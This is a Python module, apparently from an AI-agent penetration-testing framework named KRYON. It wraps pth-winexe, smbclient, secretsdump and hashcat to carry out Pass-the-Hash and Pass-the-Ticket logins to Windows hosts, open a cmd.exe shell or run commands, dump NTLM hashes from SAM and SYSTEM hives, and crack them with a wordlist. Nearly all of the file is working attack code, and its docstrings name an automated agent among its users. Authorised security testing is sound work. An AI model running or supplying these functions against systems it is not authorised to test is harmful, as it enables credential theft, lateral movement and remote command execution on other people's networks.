"""
KRYON Pass-the-Hash Attack Module
===================================

Implements Pass-the-Hash and Pass-the-Ticket attacks for Windows networks.
Uses Impacket-style tools for NTLM hash authentication.

Primary Users:
- Pentest Agent (Alpha-Red)
- Network Analyst (Alpha-Silver)
"""

from typing import Any, Optional

from kryon.tools.common import generic_linux_command


def pass_the_hash(
    target: str,
    username: str,
    ntlm_hash: str,
    domain: Optional[str] = ".",
    command: Optional[str] = None,
) -> dict[str, Any]:
    """
    Perform Pass-the-Hash attack to authenticate to remote system.

    Args:
        target: Target IP or hostname
        username: Username
        ntlm_hash: NTLM hash (LM:NT or just NT hash)
        domain: Domain name (defaults to local)
        command: Optional command to execute

    Returns:
        Dictionary with attack result

    Example:
        >>> result = pass_the_hash(
        ...     target="192.168.1.100",
        ...     username="Administrator",
        ...     ntlm_hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        ... )
    """
    result = {"success": False, "output": "", "authenticated": False, "error": None}

    try:
        # Build pth command using impacket
        cmd_parts = ["pth-winexe"]
        cmd_parts.append(f"-U {domain}/{username}%{ntlm_hash}")
        cmd_parts.append(f"//{target}")

        if command:
            cmd_parts.append(command)
        else:
            cmd_parts.append("cmd.exe")

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            result["success"] = True
            result["authenticated"] = True
            result["output"] = cmd_result.get("output", "")
        else:
            result["error"] = cmd_result.get("error", "PTH attack failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def pass_the_ticket(
    target: str,
    ticket_file: str,
    service: Optional[str] = "cifs",
) -> dict[str, Any]:
    """
    Perform Pass-the-Ticket attack using Kerberos ticket.

    Args:
        target: Target system
        ticket_file: Path to ticket file (.kirbi or .ccache)
        service: Service to access (cifs, http, ldap)

    Returns:
        Dictionary with attack result

    Example:
        >>> result = pass_the_ticket(
        ...     target="dc01.domain.com",
        ...     ticket_file="/tmp/admin.kirbi"
        ... )
    """
    result = {"success": False, "output": "", "error": None}

    try:
        # Set KRB5CCNAME environment variable
        import os

        os.environ["KRB5CCNAME"] = ticket_file

        # Use ticket to access service
        cmd_result = generic_linux_command("smbclient", f"-k //{target}/{service}")

        if cmd_result.get("success"):
            result["success"] = True
            result["output"] = cmd_result.get("output", "")
        else:
            result["error"] = cmd_result.get("error", "PTT attack failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def extract_ntlm_hash(
    sam_file: str,
    system_file: str,
    output_file: Optional[str] = None,
) -> dict[str, Any]:
    """
    Extract NTLM hashes from SAM and SYSTEM registry hives.

    Args:
        sam_file: Path to SAM hive
        system_file: Path to SYSTEM hive
        output_file: Optional output file for hashes

    Returns:
        Dictionary with extracted hashes

    Example:
        >>> hashes = extract_ntlm_hash("/tmp/SAM", "/tmp/SYSTEM")
    """
    result = {"success": False, "hashes": [], "error": None}

    try:
        # Use secretsdump from impacket
        cmd_parts = ["secretsdump.py", "-sam", sam_file, "-system", system_file, "LOCAL"]

        if output_file:
            cmd_parts.extend(["-outputfile", output_file])

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            result["success"] = True

            # Parse hashes from output
            for line in output.split("\n"):
                if ":" in line and len(line.split(":")) >= 3:
                    result["hashes"].append(line.strip())
        else:
            result["error"] = cmd_result.get("error", "Hash extraction failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def crack_ntlm_hash(
    ntlm_hash: str,
    wordlist: str,
    rules: Optional[str] = None,
) -> dict[str, Any]:
    """
    Attempt to crack NTLM hash using hashcat or john.

    Args:
        ntlm_hash: NTLM hash to crack
        wordlist: Path to wordlist
        rules: Optional rules file for mangling

    Returns:
        Dictionary with cracking result

    Example:
        >>> result = crack_ntlm_hash(
        ...     ntlm_hash="31d6cfe0d16ae931b73c59d7e0c089c0",
        ...     wordlist="/usr/share/wordlists/rockyou.txt"
        ... )
    """
    result = {"success": False, "cracked": False, "password": None, "error": None}

    try:
        # Try hashcat first
        cmd_parts = ["hashcat", "-m", "1000", "-a", "0", ntlm_hash, wordlist]

        if rules:
            cmd_parts.extend(["-r", rules])

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")

            # Parse cracked password
            if ":" in output:
                for line in output.split("\n"):
                    if ntlm_hash.lower() in line.lower() and ":" in line:
                        password = line.split(":")[-1].strip()
                        result["cracked"] = True
                        result["password"] = password
                        break

            result["success"] = True
        else:
            result["error"] = cmd_result.get("error", "Hash cracking failed")

    except Exception as e:
        result["error"] = str(e)

    return result
